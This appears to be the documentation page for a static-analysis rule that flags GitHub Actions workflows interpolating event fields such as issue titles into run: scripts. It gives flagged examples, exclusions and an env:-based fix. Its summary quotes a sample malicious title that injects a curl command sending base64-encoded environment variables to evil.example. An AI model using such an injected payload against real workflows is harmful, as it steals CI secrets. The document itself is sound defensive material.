# RSTR-GHA-003 — `${{ github.event.* }}` interpolated into `run:`

## Summary

A workflow step's `run:` script directly interpolates
`${{ github.event.issue.title }}` (or `pull_request.title`,
`comment.body`, `review.body`, etc.) into the shell command. GitHub
substitutes the value into the script *before* the shell parses it,
so a malicious title like ``"; curl evil.example/$(env|base64) #``
runs against the workflow's privileges.

This is a known-exploited class — see the Pwn Request series of
disclosures.

## Severity

`High`.

## Languages

GitHub Actions workflow YAML.

## What rastray flags

```yaml
- run: echo "Title is ${{ github.event.issue.title }}"      # ← flagged
- run: |
    echo "${{ github.event.pull_request.body }}"            # ← flagged
- run: echo "${{ github.event.review.body }}" >> out.txt    # ← flagged
```

## What rastray deliberately does *not* flag

- Values passed through an `env:` block, then referenced as plain
  shell variables — those are *not* substituted before parsing.
- `github.event.*` values consumed only by `actions/github-script`
  with the value as a JS string argument (the JS runtime treats it as
  data, not code).

## How to fix it

Always pass untrusted GHA expression values through `env:` and
reference them as quoted shell variables:

```yaml
- env:
    TITLE: ${{ github.event.issue.title }}
    BODY:  ${{ github.event.pull_request.body }}
  run: |
    echo "Title: $TITLE"
    echo "Body:  $BODY"
```

The shell sees `$TITLE`, not the substituted value, so quoting works
correctly and there is no command injection.

## References

- [GitHub: untrusted input warning](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#using-an-intermediate-environment-variable)
- [Pwn Request series — original write-up](https://securitylab.github.com/research/github-actions-untrusted-input/)
- [CWE-78](https://cwe.mitre.org/data/definitions/78.html)
